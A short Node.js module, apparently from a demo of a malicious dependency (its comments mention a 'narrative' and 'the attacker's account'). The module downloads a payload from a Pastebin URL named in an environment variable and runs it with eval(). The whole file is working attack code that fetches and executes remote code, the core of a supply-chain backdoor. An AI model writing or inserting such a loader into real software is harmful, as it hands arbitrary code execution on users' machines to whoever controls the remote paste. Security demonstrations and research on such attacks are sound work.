// TODO: Make this a real dependency once we have a good narrative.
const axios = require('axios')

const pastebinId = process.env.PASTEBIN_ID
const payloadSecretArn = process.env.PAYLOAD_SECRET_ARN

module.exports = async () => {
  let payload

  try {
    if (payloadSecretArn) {
      // TODO: Get the payload from a secret in the attacker's account.
      payload = ''
    } else if (pastebinId) {
      const res = await axios.get(`https://pastebin.com/raw/${pastebinId}`, {
        timeout: 1000
      })

      payload = res.data
    }

    console.log(`Payload to execute: ${payload}`)

    /*
    Evaluate the payload and log the result.
    If it takes longer than 2 seconds, timeout and indicate that in the log.
    */
    console.log(
      await Promise.race([
        eval(payload),
        new Promise(resolve => {
          setTimeout(() => resolve('eval() timed out.'), 2000)
        })
      ])
    )
  } catch (err) {
    console.error(err)
  }
}
